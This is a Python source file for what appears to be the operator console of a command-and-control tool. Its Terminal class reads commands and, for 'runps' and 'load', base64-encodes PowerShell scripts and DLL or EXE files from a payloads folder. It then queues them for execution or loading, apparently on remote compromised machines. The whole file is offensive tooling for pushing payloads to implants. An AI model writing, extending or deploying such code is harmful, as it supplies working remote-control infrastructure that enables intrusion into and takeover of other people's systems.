import base64
import os
from pathlib import Path;

class Terminal():
    payloadspath = Path(__file__).parent.parent.joinpath("payloads")
    def listen(self, commands):
        while True:
            try:
                cmd = input()
                splits = cmd.split(" ")
                if splits[0] == "runps":
                    data = open(str(self.payloadspath.joinpath(splits[1]).with_suffix(".ps1")),"rb").read()
                    b64 = base64.b64encode(data)
                    cmd = b"runps " + b64
                    for each in splits[2:]:
                        cmd = cmd + b" " + each.encode()
                if splits[0] == "load":
                    data = b""
                    try:
                        data = open(str(self.payloadspath.joinpath(splits[1]).with_suffix(".dll")),"rb").read()
                    except:
                        data = open(str(self.payloadspath.joinpath(splits[1]).with_suffix(".exe")),"rb").read()
                    b64 = base64.b64encode(data)
                    cmd = b"load " + b64 + b" " + splits[1].encode()
                commands.put(cmd)
                if cmd == "exit":
                    break
            except KeyboardInterrupt:
                print("KeyboardInterrupt")
                break
            except EOFError:
                print("EOFError")
                break
            except Exception as e:
                print("Exception: " + str(e))
                break